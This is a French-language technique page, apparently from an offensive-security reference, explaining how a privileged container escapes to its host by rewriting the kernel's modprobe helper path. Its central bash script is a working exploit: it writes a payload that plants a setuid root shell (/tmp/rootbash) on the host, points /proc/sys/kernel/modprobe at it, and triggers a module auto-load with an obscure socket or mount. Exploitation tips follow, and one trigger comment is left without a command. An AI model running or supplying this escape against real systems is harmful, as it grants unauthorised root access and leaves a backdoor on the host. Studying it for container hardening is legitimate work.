---
title: "Chemin modprobe : détourner le chargeur automatique de modules noyau"
order: 1
description: "Le noyau exécute le programme nommé dans /proc/sys/kernel/modprobe, en tant que root dans les espaces de noms de l'hôte, chaque fois qu'il doit charger automatiquement un module. Un conteneur capable d'écrire ce chemin le fait pointer vers une charge utile puis déclenche un chargement automatique, par exemple en utilisant un protocole réseau ou un type de système de fichiers inconnu, ce qui amène le noyau à exécuter la charge utile sur l'hôte."
keywords:
  - chemin modprobe
  - chargement automatique de module
  - usermode helper
  - request_module
  - évasion de conteneur
---

# Chemin modprobe

Lorsque le noyau a besoin d'un module qu'il n'a pas chargé, il appelle `request_module`, qui exécute l'assistant en espace utilisateur nommé dans `/proc/sys/kernel/modprobe` (normalement `/sbin/modprobe`). Cet assistant s'exécute en tant que root dans les espaces de noms initiaux de l'hôte. Si un conteneur peut écrire `modprobe` sur le procfs de l'hôte, il remplace le chemin de l'assistant par sa propre charge utile, puis déclenche toute action qui amène le noyau à tenter un chargement automatique, et le noyau exécute la charge utile sur l'hôte.

Confirmez la possibilité d'écriture :

```bash
cat /proc/sys/kernel/modprobe
[ -w /proc/sys/kernel/modprobe ] && echo writable
```

## La technique

```bash
# 1. Host-resolvable payload path via the overlay upperdir
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
cat > /payload <<SH
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
id > $host/out 2>&1
SH
chmod +x /payload

# 2. Point the module loader at the payload
echo "$host/payload" > /proc/sys/kernel/modprobe

# 3. Trigger an auto-load. Any of these makes the kernel call request_module:
#    use a socket for a protocol family with no loaded module,
python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_STREAM, 132)' 2>/dev/null
#    or mount an unknown filesystem type,
mount -t doesnotexist none /mnt 2>/dev/null
#    or run a binary with an unknown magic that needs a binfmt module
sleep 1; cat /out; ls -l /tmp/rootbash
```

L'appel socket avec un numéro de protocole obscur (ici SCTP, 132) amène le noyau à effectuer `request_module("net-pf-...")`, invoquant le chemin modprobe, qui est désormais la charge utile.

## Notes d'exploitation

- Le déclencheur doit être une action que le noyau traite en chargeant automatiquement un module ; une famille de protocoles ou un type de système de fichiers véritablement absent de l'hôte fonctionne le mieux. Si le module est déjà chargé, aucun `request_module` ne se déclenche, alors choisissez-en un obscur.
- Comme les autres voies d'assistant en espace utilisateur, le chemin de la charge utile doit se résoudre sur le système de fichiers de l'hôte, d'où la récupération du `upperdir`.
- Écrire `modprobe` nécessite que le procfs de l'hôte soit monté en écriture, ce qui implique généralement `CAP_SYS_ADMIN` ou `--privileged` ; la vue sysctl cloisonnée par espaces de noms d'un conteneur n'affecterait pas l'hôte.

## Références

- [Documentation du noyau : sysctl modprobe](https://docs.kernel.org/admin-guide/sysctl/kernel.html#modprobe)
- [man 2 request_key / comportement de kmod](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [HackTricks : modprobe escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts)
